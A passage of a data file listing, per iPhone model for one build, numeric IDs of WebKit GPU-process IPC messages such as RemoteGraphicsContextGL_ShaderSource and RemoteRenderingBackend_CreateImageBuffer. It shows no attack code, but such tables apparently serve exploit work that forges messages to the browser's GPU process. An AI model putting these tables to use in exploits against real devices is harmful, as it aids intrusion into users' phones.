      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,6_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,7_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,8_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,2_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,3_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,4_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,5_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone16,1_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone16,2_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,1_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,2_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,3_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,4_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
